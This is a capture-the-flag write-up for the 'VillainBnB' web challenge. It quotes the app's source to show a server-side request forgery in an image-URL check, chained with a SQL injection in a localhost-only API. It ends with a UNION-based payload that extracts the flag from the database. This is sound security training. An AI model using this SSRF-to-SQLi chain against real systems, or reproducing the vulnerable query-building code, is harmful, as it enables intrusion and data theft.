# VillainBnB

# VillainBnB

### Description

VillainBnB

This is a website where Villains can get short-term rentals for their nefarious deeds. There's a flag here somewhere though, can you get it from the database?

[https://uscybercombine-s4-villainbnb.chals.io/](https://uscybercombine-s4-villainbnb.chals.io/)

&#x20;[VillainBnB.zip](https://ctfd.uscybergames.com/files/69a0b1bc87d078101316288f4d4f56c6/VillainBnB.zip?token=eyJ1c2VyX2lkIjozMDg2LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjozMTJ9.ZmBSkQ.I3EAj0neGbBunpnvwcPSVGU_Qd8)

### Solution

App:

![VillainBnB](/assets/ctf/uscybergames/villainbnb.png)

Creds: `test02:test02`

![VillainBnB-1](/assets/ctf/uscybergames/villainbnb-1.png)

We get new options: `Create Listing` and `Your Listings`

`Create` let's us add new listing and `Your Listing` shows items created by us.

We are given source so let's look into the code. There's 2 part of app, API and frontend itself.

API is accessible to only localhost

```python
api_bp = Blueprint('api', __name__, url_prefix='/api')

def localhost_only(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return jsonify({'error': 'Access denied'}), 403
        return func(*args, **kwargs)
    return wrapper
```

Create handler function:

```python
@app.route('/create', methods=['GET', 'POST'])
@login_required
def create_listing():
    if request.method == 'POST':
        name = request.form['name']
        description = request.form['description']
        image_url = request.form['image_url']

        valid_img = validate_image_url(image_url)

        if valid_img != True:
            flash(f'Invalid image URL. Please provide a valid image URL.\n\nResponse was:\n\n{valid_img}', 'danger')
            return redirect(url_for('create_listing'))

        new_listing = Listing(name=name, description=description, image_url=image_url, author=current_user)
        db.session.add(new_listing)
        db.session.commit()
        flash('Listing created successfully!', 'success')
        return redirect(url_for('index'))

    return render_template('create_listing.html')
```

`validate_image_url` function:

```python
def validate_image_url(url):
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        content_type = response.headers.get('Content-Type')
        if content_type and 'image' in content_type:
            return True
        else:
            return response.text
    except requests.exceptions.RequestException:
        return False
```

Lucky for us the request is made by server, which means we can sneak an internal url and see response. Application is kind enough to show us request response in the flash cards. Unfortunately the `flash` uses Javascript and it doesn't play well in Burpsuite without valid session (just a bit of pain).

The flag is placed inside database, but no way to access it.

```python
def initialize_database():
    db.create_all()

    # Add initial listings
    admin_pass = secrets.token_hex(16)
    user = User(username='admin', password=admin_pass)
    print(f'Admin password is: {admin_pass}')
    db.session.add(user)
    db.session.commit()
	...
    db.session.add(Flag(flag=FLAG))
    db.session.commit()
```

Most routes in application use prepared statements, but for some reason we have `/api/users` endpoint which does the raw request and introduces SQLi

```python
@api_bp.route('/users', methods=['GET'])
@localhost_only
def get_users():
    username = request.args.get('username')
    if username:
        query = f"SELECT * FROM user WHERE username ='{username}'"
        users = db.session.execute(text(query)).fetchall()
        users_data = [{'id': u.id, 'username': u.username} for u in users]
        return jsonify(users_data)
    else:
        users = User.query.all()
        users_data = [{'id': u.id, 'username': u.username} for u in users]
        return jsonify(users_data)
```

Make SQLi injection request:

![VillainBnB-2](/assets/ctf/uscybergames/villainbnb-2.png)

Request > Right Click > Request In Browser > In Original Session

![VillainBnB-3](/assets/ctf/uscybergames/villainbnb-3.png)

Get the flag:

```sql
http://127.0.0.1:5000/api/users?username=' UNION SELECT id,flag,NULL FROM flag-- - 
```

![VillainBnB-4](/assets/ctf/uscybergames/villainbnb-4.png)

::: tip Flag
`**SIVUSCG{whoopsies\_SSRF\_here!}**`
:::
